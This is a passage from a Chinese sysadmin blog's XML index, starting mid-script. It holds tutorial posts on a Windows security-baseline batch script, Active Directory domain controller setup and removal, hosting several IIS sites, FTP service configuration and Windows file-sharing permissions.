punctuation">.</span>inf <span class="token operator">/</span>q<span class="token function">del</span> win<span class="token punctuation">.</span>sdb <span class="token operator">/</span>q<span class="token function">echo</span>=<span class="token function">echo</span>=<span class="token function">echo</span>=<span class="token function">echo</span>=<span class="token function">echo</span> 【配置完成<span class="token punctuation">,</span>部分配置重启系统后生效】<span class="token function">echo</span>=<span class="token function">echo</span>=<span class="token function">echo</span>=<span class="token function">echo</span>=<span class="token function">echo</span> 按任意键退出pauseshutdown <span class="token operator">-</span>r <span class="token operator">-</span>t 0</code></pre><h1 id="win-ini文件内容"><a href="#win-ini文件内容" class="headerlink" title="win.ini文件内容"></a>win.ini文件内容</h1><pre class=" language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true">#口令相关配置</span>minlen=12PASS_MAX_DAYS=180PASS_MIN_DAYS=0remember=3deny=5<span class="token comment" spellcheck="true">#屏幕超时时间</span>TMOUT=600<span class="token comment" spellcheck="true">#自定义管理员用户名</span>admin_name=admin<span class="token comment" spellcheck="true">#SNMP相关配置</span>SNMP_password=dont_use_publicSNMP_ip=127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1<span class="token comment" spellcheck="true">#WSUS配置</span>WSUS_ip=http:<span class="token operator">/</span><span class="token operator">/</span>127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1<span class="token comment" spellcheck="true">#NTP配置</span>NTP_ip=210<span class="token punctuation">.</span>72<span class="token punctuation">.</span>145<span class="token punctuation">.</span>44<span class="token comment" spellcheck="true">#登录信息设置</span>Title=<span class="token string">"This is a normal server."</span>Content=<span class="token string">"You can't use the compter."</span></code></pre><p>​        批处理实现的原理使用<code>secedit</code>命令将自定义的安全模板（<code>win.ini</code>）应用于本地策略并将其转化为数据库（<code>win.sdb</code>）进行存储。其中安全模板有指定的格式可以通过在<code>mmc</code>中的【安全模板】和【安全配置和分析】查看其书写格式。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://github.com/pssss/Security-Baseline" target="_blank" rel="noopener">Security-Baseline</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全加固 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 批处理 </tag>
            
            <tag> 安全加固 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域控管理实验</title>
      <link href="/2020/11/12/yu-kong-guan-li-shi-yan/"/>
      <url>/2020/11/12/yu-kong-guan-li-shi-yan/</url>
      
        <content type="html"><![CDATA[<h1 id="创建主域控"><a href="#创建主域控" class="headerlink" title="创建主域控"></a>创建主域控</h1><h2 id="主域控限制条件"><a href="#主域控限制条件" class="headerlink" title="主域控限制条件"></a>主域控限制条件</h2><ul><li>安装者必须是本地管理员权限</li><li>操作系统版本必须是服务器版本（Web版除外）</li><li>本地至少一个分区是NTFS文件系统</li><li>配置静态的IP地址和子网掩码  （正确TCP/IP设置）</li><li>磁盘空间足够</li></ul><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><ol><li><p>在运行框中输入<code>dcpromo</code>（<code>Directory Controller Promote</code>）命令后，显示如下界面标识已经开始准备安装域控制器。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/域控安装准备.png" alt="域控安装准备"></center></li><li><p>等待少许时间后，显示域服务安装向导如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/域服务安装向导.png" alt="域服务安装向导"></center></li><li><p>点击【下一步】按钮后，域创建配置界面，这里选择【在新林中新建域】选项显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/创建新林域.png" alt="创建新林域"></center></li><li><p>点击【下一步】按钮进入林根级域FQDN界面，设置FQDN结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/FQDN设置.png" alt="FQDN设置"></center></li><li><p>点击【下一步】按钮后，会先<strong>验证NetBIOS信息</strong>通过之后，显示林功能级别设置界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/林功能设置.png" alt="林功能设置"></center></li><li><p>点击【下一步】按钮后，进入域功能级别设置界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/域功能级别设置.png" alt="域功能级别设置"></center></li><li><p>点击【下一步】按钮后，会先<strong>检查DNS配置</strong>检查完成之后会显示其他域控制器选项，显示界面如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/其他域控制器选项设置.png" alt="其他域控制器选项设置"></center></li><li><p>点击【下一步】按钮后，进入数据信息位置设置界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/数据信息位置设置.png" alt="数据信息位置设置"></center></li><li><p>点击【下一步】按钮后进入密码设置界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/域账户管理员密码设置.png" alt="域账户管理员密码设置"></center></li><li><p>点击【下一步】按钮后进入摘要信息显示界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/信息摘要.png" alt="信息摘要"></center></li><li><p>点击【下一步】按钮后活动目录便开始安装。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/活动目录安装过程.png" alt="活动目录安装过程"></center></li><li><p>显示如下图所示信息表示活动目录已经安装成功。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/新建域后登录.png" alt="新建域后登录"></center></li></ol><h1 id="主域控功能提升"><a href="#主域控功能提升" class="headerlink" title="主域控功能提升"></a>主域控功能提升</h1><ul><li>提升域功能</li><li>提升林功能</li></ul><ol><li><p>首先必须使用域控制器管理员登录，然后打开【Active Directory 域和信任关系】管理界面，如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/域和信任管理.png" alt="域和信任管理"></center></li><li><p>右键【baidu.com】 → 【提升域功能级别…】，显示提升域功能级别设置界面选定功能级别后点击【提升】按钮即可完成提升操作，验证结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/提升域功能级别.png" alt="提升域功能级别"></center></li><li><p>右键【Active Directory 域和信任管理】 → 【提升林功能级别…】，显示提升林功能级别设置界面选定功能级别后点击【提升】按钮即可完成提升操作，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/提升林功能级别.png" alt="提升林功能级别"></center></li></ol><h1 id="客户端加入域"><a href="#客户端加入域" class="headerlink" title="客户端加入域"></a>客户端加入域</h1><ol><li><p>客户端登录成功后首先需要设置一下首先DNS服务器，因为本实验环境的DHCP中没有设置DNS服务器，所以这里需要先设置一下。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/客户端DNS设置.png" alt="客户端DNS设置"></center></li><li><p>客户机加入域。计算机 → 属性 → 高级系统设置 → 计算机名 → 更改 → 域设置。设置结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/客户机加入域.png" alt="客户机加入域"></center><p><font color="blue">新加入域的成员必须要通过验证才可以，普通用户验证即可，设置完成之后重启才会生效</font></p></li><li><p>域用户登录。如下图所示为域用户的登录界面。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/域用户登录姐买你.png" alt="域用户登录界面"></center><p>其中指定方式有如下几种：</p><pre class=" language-shell"><code class="language-shell">baidu.com\adminadmin@baidu.com</code></pre></li><li><p>登录后查看结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/域用户登录成功.png" alt="域用户登录成功"></center></li></ol><h1 id="创建额外域控"><a href="#创建额外域控" class="headerlink" title="创建额外域控"></a>创建额外域控</h1><ol><li><p>在运行框中输入<code>dcpromo</code>（<code>Directory Controller Promote</code>）命令后，显示如下界面标识已经开始准备安装域控制器。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/域控安装准备.png" alt="域控安装准备"></center></li><li><p>等待少许时间后，显示域服务安装向导如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/域服务安装向导.png" alt="域服务安装向导"></center></li><li><p>点击【下一步】按钮后，域创建配置界面，这里选择【在新林中新建域】选项显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/设置为额外域控制器.png" alt="设置为额外域控制器"></center></li><li><p>点击【下一步】按钮进入网络凭据设置界面，设置网络凭据结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/网络凭据设置.png" alt="网络凭据设置"></center><p>注意DNS服务器信息配置。</p></li><li><p>点击【下一步】按钮后，会先验凭据信息通过之后，显示林域选择界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/额外域控林域选择.png" alt="额外域控林域选择"></center></li><li><p>点击【下一步】按钮后，进入站点选择界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/站点选择界面.png" alt="站点选择界面"></center></li><li><p>点击【下一步】按钮后，会先<strong>检查DNS配置</strong>检查完成之后会显示其他域控制器选项，显示界面如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/额外域控制器DNS和全局编录设置.png" alt="额外域控制器DNS和全局编录设置"></center></li><li><p>点击【下一步】按钮后，进入数据信息位置设置界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/数据信息位置设置.png" alt="数据信息位置设置"></center></li><li><p>点击【下一步】按钮后进入密码设置界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/域账户管理员密码设置.png" alt="域账户管理员密码设置"></center></li><li><p>点击【下一步】按钮后进入摘要信息显示界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/摘要.png" alt="摘要"></center></li><li><p>点击【下一步】按钮后活动目录便开始进行数据传输和写入。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/数据传输.png" alt="数据传输"></center></li><li><p>显示如下图所示信息表示额外域控制器已经创建成功。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/额外域控制器创建成功.png" alt="额外域控制器创建成功"></center></li><li><p>主域控制器和额外域控制器具有同步机制，新建的user等会同时出现在另外一个域控制器中。</p></li></ol><h1 id="卸载域控"><a href="#卸载域控" class="headerlink" title="卸载域控"></a>卸载域控</h1><ul><li>卸载服务</li><li>删除站点</li><li>退出域</li></ul><ol><li><p>在运行框中输入<code>dcpromo</code>（<code>Directory Controller Promote</code>）命令后，显示如下界面标识已经开始准备安装域控制器。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/域控安装准备.png" alt="域控安装准备"></center></li><li><p>等待少许时间后，显示域服务安装向导如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/域服务安装向导.png" alt="域服务安装向导"></center></li><li><p>点击【下一步】按钮后，进入删除域界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/删除域.png" alt="删除域"></center></li><li><p>点击【下一步】按钮进入删除DNS委派界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/删除DNS委派.png" alt="删除DNS委派"></center></li><li><p>点击【下一步】按钮首先会验证域管理员密码后显示密码设置界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/设置本地账户密码.png" alt="设置本地账户密码"></center></li><li><p>点击【下一步】按钮，显示显示删除域控制器设置的摘要信息，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/删除域控制器的摘要信息.png" alt="删除域控制器的摘要信息"></center></li><li><p>点击【下一步】按钮将开始删除过程，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/删除域控制机过程显示.png" alt="删除域控制机过程显示"></center></li><li><p>删除站点。在Active Directory站点和服务管理界面中查找并删除刚降低的域控制器的站点信息，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/删除站点.png" alt="删除站点"></center></li><li><p>退出域。在计算机属性界面中将隶属关系改为工作组，即可退出域，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DCProMoteTest/退出域.png" alt="退出域"></center></li></ol><h1 id="域控强制降级"><a href="#域控强制降级" class="headerlink" title="域控强制降级"></a>域控强制降级</h1><ol><li>在命令提示符下，输入<code>dcpromo /forceremoval</code></li><li>如果域控制器托管任何操作主机角色，或者它是DNS服务器或全局编录服务器，则会出现警告，解释强制山下湖将如何应用其余环境。阅读每个警告之后，单击“是”。若要在删除操作之前抑制警告，请在命令行键入<code>/demotefsmo:yes</code>。</li><li>在“欢迎使用”Active Directory域服务安装向导”页上，单击【下一步】。</li><li>在“强制删除Active Directory域服务”页上，查看有关强制删除AD DS和源数据清理要求的信息，然后单击“下一步”。</li><li>在“管理员密码”页面上，为本地Administrator账户键入安全密码并确认，然后单击【下一步】。</li><li>确认所做选择正确无误之后，请单击【下一步】删除AD DS。</li></ol><p><font color="blue">由于强制卸载，域内其他DC不知此DC已不存在，需要在其复制伙伴上将其手动清理，然后把清理后的AD信息复制到其他DC上</font>。</p>]]></content>
      
      
      <categories>
          
          <category> 网络服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
            <tag> 活动目录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web服务器运行多个网站</title>
      <link href="/2020/11/10/web-fu-wu-qi-yun-xing-duo-ge-wang-zhan/"/>
      <url>/2020/11/10/web-fu-wu-qi-yun-xing-duo-ge-wang-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>​        为了充分利用资源，一台服务器往往不会部署一个网站，通常都是一个服务器上运行多个网站，旁站攻击就利用该方式通过其他网站获取服务器权限，从而得到被测网站权限。</p><p>​        一台服务器上运行多个网站时，每个网站可以称为虚拟主机。对于虚拟主机的标识主要是通过IP地址、端口号、主机名。显示多网站运行的方式有如下几种方式：</p><ul><li>不同IP地址，相同端口<ul><li>服务器需要多个网卡（不太实用）</li></ul></li><li>相同IP地址，不同端口<ul><li>仅需要一个网卡即可</li></ul></li><li>不同IP地址，不同端口（不使用）</li><li>相同IP地址，相同端口，不同主机名<ul><li>根据主机名判别，但需要进行域名解析</li></ul></li></ul><h1 id="0x02-相同IP-不同端口"><a href="#0x02-相同IP-不同端口" class="headerlink" title="0x02 相同IP+不同端口"></a>0x02 相同IP+不同端口</h1><ol><li><p>新建端口为80的网站</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WebServerMultiSite/新建80端口网站.png" alt="新建80端口网站"></center></li><li><p>新建端口为81的网站</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WebServerMultiSite/新建81端口网站.png" alt="新建81端口网站"></center></li><li><p>jd网站访问结果。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WebServerMultiSite/jd网站访问结果.png" alt="jd网站访问结果"></center></li><li><p>baidu网站访问结果。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WebServerMultiSite/baidu网站访问结果.png" alt="baidu网站访问结果"></center></li></ol><h1 id="0x03-相同IP-相同端口"><a href="#0x03-相同IP-相同端口" class="headerlink" title="0x03 相同IP+相同端口"></a>0x03 相同IP+相同端口</h1><ol><li><p>创建主机名为<code>www.jd.com</code>的网站。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WebServerMultiSite/创建jd网站.png" alt="创建jd网站"></center></li><li><p>创建主机名为<code>www.baidu.com</code>的网站。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WebServerMultiSite/创建baidu网站.png" alt="创建baidu网站"></center></li><li><p>修改host文件。<code>C:\Windows\System32\drivers\etc\hosts</code>。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WebServerMultiSite/修改hosts文件.png" alt="修改hosts文件"></center></li><li><p>访问<code>www.baidu.com</code>显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WebServerMultiSite/访问baidu网站结果.png" alt="访问baidu网站结果"></center></li><li><p>访问<code>www.jd.com</code>显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/WebServerMultiSite/访问jd网站结果.png" alt="访问jd网站结果"></center></li></ol><h1 id="0x04-实验分析"><a href="#0x04-实验分析" class="headerlink" title="0x04 实验分析"></a>0x04 实验分析</h1><ul><li>使用端口做多站运行时，不需要DNS进行解析、只需要指定一个未被使用的端口即可。</li><li>使用主机名做多占运行时，需要使用DNS进行解析，否则无法找到指定网站。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FTP服务</title>
      <link href="/2020/11/10/ftp-fu-wu/"/>
      <url>/2020/11/10/ftp-fu-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="FTP协议概述"><a href="#FTP协议概述" class="headerlink" title="FTP协议概述"></a>FTP协议概述</h1><p>​        FTP（File Transfer Protocol，文件传输协议） 是 TCP/IP 协议组中的协议之一。<br>​        FTP协议包括两个组成部分，其一为<strong>FTP服务器</strong>，其二为<strong>FTP客户端</strong>。<br>​        其中FTP服务器用来存储文件，用户可以使用FTP客户端通过FTP协议访问位于FTP服务器上的资源。在开发网站的时候，通常利用FTP协议把网页或程序传到Web服务器上。此外，由于FTP传输效率非常高，在网络上传输大的文件时，一般也采用该协议。</p><h1 id="常见FTP客户端"><a href="#常见FTP客户端" class="headerlink" title="常见FTP客户端"></a>常见FTP客户端</h1><h2 id="WWW浏览器访问"><a href="#WWW浏览器访问" class="headerlink" title="WWW浏览器访问"></a>WWW浏览器访问</h2><ul><li>最常用（在资源管理器中打开，显示结果以文件的形式显示，其后台调用的还是浏览器）</li></ul><h2 id="命令行工具"><a href="#命令行工具" class="headerlink" title="命令行工具"></a>命令行工具</h2><p>​        具体操作方法：</p><ol><li><p>登录FTP服务器：命令提示符输入：</p><pre class=" language-shell"><code class="language-shell">ftp   FTP服务器的IP地址ftp 回车 open ip地址 端口号</code></pre></li><li><p>输入用户名：直接输入</p><ul><li><font color="blue">以数字2或3的百位数说明登录成功；以5开头的百位数代表登录失败</font></li></ul></li><li><p>输入密码：</p><ul><li>不显示密码</li></ul></li><li><p>显示文件列表 </p><ul><li><code>ls</code> （简单显示）  </li><li><code>dir</code>  （详细显示）</li></ul></li><li><p>进入文件夹</p><ul><li><code>cd   文件夹名</code></li></ul></li><li><p>后退一步</p><ul><li><code>cd  . .</code></li></ul></li><li><p>下载文件</p><ul><li><code>get    文件名</code>    （<font color="blue">.默认所在的下载位置是当前登录账户所在的文件夹内</font>）</li></ul></li><li><p>上传文件</p><ul><li><code>put    文件名</code>    （<font color="blue">默认要把需要 上传的文件放在当前登录账户的文件夹内</font>）</li></ul></li><li><p>删除文件</p><ul><li><code>del    文件名</code></li></ul></li><li><p>退出登录</p><ul><li><code>bye</code></li><li><code>quit</code></li></ul></li></ol><h2 id="专用图形工具"><a href="#专用图形工具" class="headerlink" title="专用图形工具"></a>专用图形工具</h2><ul><li>FileZilla</li><li>CuteFTP</li><li>FlashFXP</li><li>LeapFTP</li></ul><h1 id="常见的服务端程序"><a href="#常见的服务端程序" class="headerlink" title="常见的服务端程序"></a>常见的服务端程序</h1><h2 id="windows-FTP-服务"><a href="#windows-FTP-服务" class="headerlink" title="windows FTP 服务"></a>windows FTP 服务</h2><p>​        windows服务器系统自带的FTP角色</p><ol><li>需要在角色中 → 添加角色 → Web服务器（IIS） → 添加必须的功能 → 勾选上FTP服务 → 安装</li></ol><p>2、启动FTP站点  （默认生成一个站点（可删也可保留）默认主目录：<code>C:\inetpub\ftproot</code>）</p><p>3、权限：用户的访问权限是NTFS权限和FTP权限的交集（严谨优先）</p><p>4、匿名账户：<code>anonymous</code>和 <code>ftp</code></p><h2 id="Server-U"><a href="#Server-U" class="headerlink" title="Server-U"></a>Server-U</h2><p>​        支持windows服务器系统和客户端系统，不可和FTP服务同时启动提供FTP服务，端口冲突。</p><h2 id="其他第三方程序"><a href="#其他第三方程序" class="headerlink" title="其他第三方程序"></a>其他第三方程序</h2><ul><li>Xlight  ftp Server  </li><li>RaidenFTPD </li><li>EFT  Server  </li><li>FileZilla  Server</li></ul><h1 id="FTP模式"><a href="#FTP模式" class="headerlink" title="FTP模式"></a>FTP模式</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>​        默认情况下FTP协议使用TCP端口中的 20和21这两个端口，其中20用于传输数据，21用于传输控制信息。但是，是否使用20作为传输数据的端口与FTP使用的传输模式有关，如果采用主动模式，那么数据传输端口就是20；如果采用被动模式，则具体最终使用哪个端口要服务器端和客户端协商决定</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li><p>Port（主动模式）<br>FTP 客户端首先和FTP服务器的TCP 21端口建立连接，通过这个通道发送命令，客户端需要接收数据的时候在这个通道上发送PORT命令。 PORT命令包含了客户端用什么端口接收数据。在传送数据的时候，服务器端通过自己的TCP 20端口连接至客户端的指定端口发送数据。 FTP server必须和客户端建立一个新的连接用来传送数据。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FTPServer/主动模式.jpg" alt="主动模式"></center></li><li><p>Passive（被动模式）<br>在建立控制通道的时候和Standard模式类似，但建立连接后发送的不是Port命令，而是Pasv命令。FTP服务器收到Pasv命令后，随机打开一个高端端口（端口号大于1024）并且通知客户端在这个端口上传送数据的请求，客户端连接FTP服务器此端口，通过三次握手建立通道，然后FTP服务器将通过这个端口进行数据的传送。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FTPServer/被动模式.jpg" alt="被动模式"></center><p>注：</p><pre><code>    很多防火墙在设置的时候都是不允许接受外部发起的连接的，所以许多位于防火墙后或内网的FTP服务器不支持PASV模式，因为客户端无法穿过防火墙打开FTP服务器的高端端口；而许多内网的客户端不能用PORT模式登陆FTP服务器，因为从服务器的TCP 20无法和内部网络的客户端建立一个新的连接，造成无法工作。</code></pre></li></ol><h1 id="FTP用户隔离"><a href="#FTP用户隔离" class="headerlink" title="FTP用户隔离"></a>FTP用户隔离</h1><ol><li><p>在ftproot(根目录)中创建<code>localuser</code>文件夹</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FTPServer/localuser文件夹.png" alt="localuser文件夹"></center></li><li><p>创建本地用户，并在<code>localuser</code>文件夹中与用户名对应的文件夹</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FTPServer/创建用户文件夹.png" alt="创建用户文件夹"></center></li><li><p>在FTP设置中启用用户隔离（勾选用户名目录&lt;禁用全局虚拟目录&gt;）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/FTPServer/启用用户隔离.png" alt="启用用户隔离"></center></li></ol><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><ul><li><a href="https://z1r0s.github.io/2020/09/07/ftp-fu-wu-qi-da-jian-phpstudyftp/">FTP服务器搭建（phpstudyftp）</a></li><li><a href="https://z1r0s.github.io/2020/09/07/ftp-fu-wu-qi-da-jian-iis/">FTP服务器搭建（iis）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络服务 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件共享</title>
      <link href="/2020/11/10/wen-jian-gong-xiang-fu-wu/"/>
      <url>/2020/11/10/wen-jian-gong-xiang-fu-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h1><h2 id="共享文件夹"><a href="#共享文件夹" class="headerlink" title="共享文件夹"></a>共享文件夹</h2><h3 id="访问方式"><a href="#访问方式" class="headerlink" title="访问方式"></a>访问方式</h3><p>UNC路径：<code>\\对方的IP地址（主机名）\共享名（映射网络驱动器）</code></p><ul><li>需要输入对方电脑上的一个用户及密码</li></ul><h3 id="共享分类"><a href="#共享分类" class="headerlink" title="共享分类"></a>共享分类</h3><ul><li>明文共享：<ul><li>访问方式：<code>\\服务器主机名或IP地址</code>：显示所有明文共享</li></ul></li><li>隐藏共享：在创建共享夹时共享名后加”$”<ul><li>访问方式：<code>\\服务器主机名或IP地址\共享名</code></li></ul></li><li>默认共享：（属于隐藏共享）<ul><li>Windows 默认创建分区的共享，访问这些默认共享需要administrator账户身份</li></ul></li></ul><h3 id="查看共享"><a href="#查看共享" class="headerlink" title="查看共享"></a>查看共享</h3><pre class=" language-shell"><code class="language-shell">net share</code></pre><h3 id="删除共享"><a href="#删除共享" class="headerlink" title="删除共享"></a>删除共享</h3><pre class=" language-shell"><code class="language-shell">net share c$ /del</code></pre><h1 id="文件服务器"><a href="#文件服务器" class="headerlink" title="文件服务器"></a>文件服务器</h1><h2 id="网络结构"><a href="#网络结构" class="headerlink" title="网络结构"></a>网络结构</h2><ol><li><p>对等网：所有的机器都需要创建相同的用户名和密码；实现彼此访问共享文件夹</p><ul><li>缺点：不适合大型网络，共享文件夹分散</li></ul></li><li><p>C/S结构：网络中提供文件资源的集中存储和访问，实现</p><ul><li>优点：集中化管理、内容控制、高可靠性、便捷的搜索服务。</li></ul></li></ol><h2 id="文件服务器角色服务"><a href="#文件服务器角色服务" class="headerlink" title="文件服务器角色服务"></a>文件服务器角色服务</h2><ul><li><strong>共享和存储管理</strong>：    为共享文件夹和存储资源提供简化管理</li><li><strong>分布式文件系统（ DFS）</strong>：两种技术：D F S命名空间和D F S复制技术<ul><li>DFS 命名空间可以使用户从一个入口访问位于多台计算机上的共享资源</li></ul></li><li><strong>文件服务器资源管理器</strong>  ：实现文件夹和卷的配额，主动屏蔽文件</li><li><strong>网络文件系统服务（NFS）</strong>：实现Windows 和Unix 混合环境的文件共享解决方案 </li><li><strong>Windows 搜索服务</strong>：是Windows  Server  2008上一种新型索引解决方案</li></ul><h1 id="文件服务安全策略"><a href="#文件服务安全策略" class="headerlink" title="文件服务安全策略"></a>文件服务安全策略</h1><ul><li>拒绝从网络访问  <ul><li>可以实现某些特殊用户通过网络访问服务器</li></ul></li><li>本地账户的共享安全模型   <ul><li>实现强制网络访问者以来宾身份访问文件服务器</li><li>注意：文件服务器上要启用来宾账户</li></ul></li><li>使用空白密码的本地账户只允许进行控制台登录   （实现服务器中没有设置密码的账户不被冒用，针对administrator账户）<ul><li>禁用选项：说明administrator 账户不能登录（空密码）</li><li>启用选项：说明administrator 账户能登录（空密码）</li></ul></li><li>密码保护共享   （启用，要求文件服务器和客户端必须拥有相同的用户名和密码才能访问）</li></ul><h1 id="共享权限"><a href="#共享权限" class="headerlink" title="共享权限"></a>共享权限</h1><ol><li><p>共享权限</p><ul><li><p>读取</p></li><li><p>更改</p></li><li><p>完全控制</p></li></ul></li><li><p>网络访问     <font color="blue">共享权限和NTFS权限的交集  （拒绝权限大于一切）</font></p><ul><li><font color="red">若将共享权限设置为everyone完全控制，则共享文件的本地NTFS权限生效</font></li></ul></li><li><p>本地访问</p><ul><li>只看NTFS权限（唯一生效NTFS权限）</li></ul></li></ol><h1 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h1><ul><li><p>137端口主要用于“NetBIOS Name Service”（NetBIOS名称服务），属于UDP协议端口，使用者只需要向局域网或互联网上的某台计算机的137端口发送一个请求，就可以获取该计算机的名称、注册用户名，以及是否安装主域控制器、IIS是否正在运行等信息。</p></li><li><p>138端口的主要作用就是提供NetBIOS环境下的计算机名浏览功能，也属于UDP协议端口，使用者只需要目标主机的138端口建立连接请求的话，就能轻松获得目标主机所处的局域网网络名称以及目标主机的计算机名称。有了计算机名称，其对应的IP地址也就能轻松获得。</p></li><li><p>139和445端口<code>NetBIOS File and Print 